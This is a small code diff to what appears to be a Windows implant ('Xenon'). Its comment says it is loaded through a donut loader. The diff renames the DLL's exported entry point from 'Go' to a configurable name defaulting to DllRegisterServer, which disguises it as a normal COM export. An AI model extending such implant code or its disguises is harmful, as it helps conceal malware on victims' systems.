@@ -1,4 +1,5 @@
 #include "Xenon.h"
+#include "Config.h"
 
 #ifdef _EXE
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR szArgs, _In_ int nCmdShow)
@@ -16,8 +17,14 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
     In order for the Dll to continue to run from the bootstrap donut loader, it requires an 
     exported function. This just keeps the process open.
 */
+
+// Default DLL export name
+#ifndef DLL_EXPORT_FUNC
+#define DLL_EXPORT_FUNC DllRegisterServer
+#endif
+
 __declspec(dllexport) 
-VOID APIENTRY Go(VOID)
+VOID APIENTRY DLL_EXPORT_FUNC(VOID)
 {
     // Long sleeping loop to keep the process running
     while (TRUE) {
